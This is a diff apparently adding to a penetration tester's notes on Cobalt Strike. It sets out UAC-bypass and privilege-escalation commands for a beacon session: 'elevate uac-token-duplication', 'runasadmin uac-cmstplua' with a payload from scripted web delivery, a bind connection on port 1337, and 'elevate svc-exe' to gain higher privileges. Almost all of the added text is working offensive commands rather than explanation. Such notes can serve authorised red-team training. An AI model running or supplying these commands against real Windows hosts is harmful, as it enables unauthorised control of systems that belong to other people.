@@ -47,6 +47,38 @@ beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
 [*] In medium integrity but user is a local administrator- UAC can be bypassed.
 ```
 
+Use the `elevate` command in CS to bypass (best)
+
+```
+help elevate
+ 
+
+elevate [exploit] [listener]
+
+#To see exploits
+elevate
+
+elevate uac-token-duplication tcp-local
+```
+
+You can also use `runasadmin` command in CS (not as good)
+```
+help runasadmin
+
+runasadmin [exploit] [command] [args]
+
+#To see exploits
+runasadmin
+
+# go to attacks, web drive-by, scripted web delivery (S), select beacon_bind_tcp as # listner
+runasadmin uac-cmstplua <insert_beacon_command_from_comment_above>
+
+connect localhost 1337
+
+# to get more privs from here
+elevate svc-exe tcp-local
+
+```
 
 
 ___
